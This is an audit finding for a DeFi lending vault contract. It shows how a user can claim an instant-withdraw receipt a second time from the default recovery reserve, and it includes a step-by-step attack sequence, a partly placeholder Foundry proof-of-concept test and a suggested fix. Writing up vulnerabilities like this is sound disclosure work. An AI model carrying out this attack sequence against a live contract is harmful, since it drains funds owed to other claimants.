### Title
Already-claimed instant withdraw receipt can be claimed a second time from the default recovery reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The 1inch "already filled order" bug class maps to double-claiming an already-settled withdraw receipt. In `IdleCreditVault`, the funded-claim path for instant withdrawals zeroes only the aggregate `instantWithdrawsRequests[_user]` but never clears the per-epoch marker `instantWithdrawsRequestsByEpoch[_user][epoch]` or the epoch total `instantWithdrawClaimsByEpoch[epoch]`. If that same epoch later defaults and recovery is finalized, `_claimDefaultedInstantWithdrawRequest` reads the stale per-epoch entry and pays the user a second time out of `defaultRecoveryReserve`.

### Finding Description
The funded instant-claim path clears only the aggregate mapping:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol:380-393
function claimInstantWithdrawRequest(address _user) external {
  _onlyIdleCDO();
  if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
    _claimDefaultedInstantWithdrawRequest(_user);
  }
  uint256 amount = instantWithdrawsRequests[_user];
  _burn(_user, amount);
  instantWithdrawsRequests[_user] = 0;
  _transferFundedClaim(_user, amount);
}
```

It does not touch `instantWithdrawsRequestsByEpoch[_user][epoch]` or `instantWithdrawClaimsByEpoch[epoch]`, which were set in `requestInstantWithdraw` (lines 371-372). `collectInstantWithdrawFunds` (lines 398-403) also only decrements `pendingInstantWithdraws`, leaving the epoch markers intact.

After a default, `claimInstantWithdrawRequest` first calls `_claimDefaultedInstantWithdrawRequest` (lines 842-856), which keys on `defaultRecoveryEpoch`:

```solidity
claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
...
instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
_burn(_user, claimBasis);
_transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
```

Attack sequence, all in one epoch that later defaults:

1. Epoch N is running. Attacker (a KYC-passed lender) calls `requestInstantWithdraw` → receipt minted, `instantWithdrawsRequestsByEpoch[attacker][N] = X`, `instantWithdrawClaimsByEpoch[N] += X`.
2. After `instantWithdrawDelay`, manager calls `getInstantWithdrawFunds`; the request is funded (honest privileged call, per rules).
3. Attacker calls `claimInstantWithdrawRequest` → paid `X` at par, aggregate zeroed, but `instantWithdrawsRequestsByEpoch[attacker][N] == X` remains.
4. Attacker deposits again (or holds other receipts) so `balanceOf(attacker) >= X` for the second `_burn`.
5. `stopEpoch` with borrower returning 0 → default. `finalizeDefault` sets `defaultRecoveryFinalized`, `defaultInstantWithdrawsFinalized`, and `defaultRecoveryEpoch == N`.
6. Attacker calls `claimInstantWithdrawRequest` again → `_claimDefaultedInstantWithdrawRequest` reads the stale `instantWithdrawsRequestsByEpoch[attacker][N] = X`, decrements `instantWithdrawClaimsByEpoch[N]` (no underflow, since step 3 never reduced it), burns the attacker's new strategy tokens, and pays `X * defaultRecoveryPrice` from `defaultRecoveryReserve`.

The reserve is sized exactly for pending claims at finalization, so every excess payout is directly stolen from other defaulted-epoch claimants.

### Impact Explanation
Theft from the default recovery reserve: the attacker is paid twice for one instant-withdraw receipt (once at par, once at the recovery haircut), draining `defaultRecoveryReserve` and leaving honest pending claimants underpaid or reverting on insufficient balance. This breaks the "one receipt, one payout" invariant.

### Likelihood Explanation
Requires a specific but realistic sequence: an instant-withdraw claim funded during an epoch that subsequently defaults, plus the attacker holding strategy tokens ≥ the stale claim for the second `_burn` (easily satisfied by re-depositing). No privileged misbehavior is needed; manager/owner calls are honest and sequential. The missing reset is unconditional.

### Recommendation
Clear the per-epoch markers in the funded claim path, mirroring `_clearWithdrawClaimForEpoch`:

```solidity
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
// clear per-epoch markers so a later default cannot re-pay a stale receipt
for each epoch e in user's instant requests:
    instantWithdrawClaimsByEpoch[e] -= instantWithdrawsRequestsByEpoch[_user][e];
    instantWithdrawsRequestsByEpoch[_user][e] = 0;
_transferFundedClaim(_user, amount);
```

Since requests are only recorded under `epochNumber`, tracking the user's latest instant request epoch (or clearing `instantWithdrawsRequestsByEpoch[_user][lastInstantEpoch]`) avoids a loop. Alternatively, delete the per-epoch entry inside `_claimDefaultedInstantWithdrawRequest` when the corresponding aggregate was already claimed — i.e., validate `claimBasis <= instantWithdrawsRequests[_user]` before paying.

### Proof of Concept
Foundry fork PoC sketch (based on `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testDoubleClaimInstantAfterDefault() external {
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(delay, 0, true);

    address attacker = makeAddr('attacker');
    _depositWithUser(attacker, 10_000 * ONE_SCALE, true);

    _startEpochAndCheckPrices(0);
    vm.prank(attacker);
    uint256 claimBasis = cdoEpoch.requestWithdraw(0, address(AAtranche)); // instant path

    // fund instant withdrawals
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();

    // first (legit) claim at par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    assertEq(underlying.balanceOf(attacker) - balPre, claimBasis);

    // attacker re-acquires strategy tokens for the second _burn
    _depositWithUser(attacker, claimBasis, true);

    // epoch ends, borrower returns 0 -> default
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    _checkDefault();

    // finalize recovery at 70%
    uint256 recovered = /* recovered amount */;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    underlying.approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // second claim pays again from the recovery reserve
    uint256 reservePre = creditVault.defaultRecoveryReserve();
    balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 stolen = claimBasis * creditVault.defaultRecoveryPrice() / RECOVERY_FULL;
    assertApproxEqAbs(underlying.balanceOf(attacker) - balPre, stolen, 5);
    assertApproxEqAbs(reservePre - creditVault.defaultRecoveryReserve(), stolen, 5);
}
```

Uncertainty note: I was unable to verify the exact conditions under which `defaultInstantWithdrawsFinalized` is set in `finalizeDefault` (e.g., whether it requires non-zero pending instant claims). If that flag is only set when unfunded instant claims existed at default time, the attack additionally requires at least one other unfunded instant receipt in the defaulted epoch, or that the flag is set unconditionally whenever instant claims were recorded — this should be confirmed in `finalizeDefault`'s body before PoC finalization.
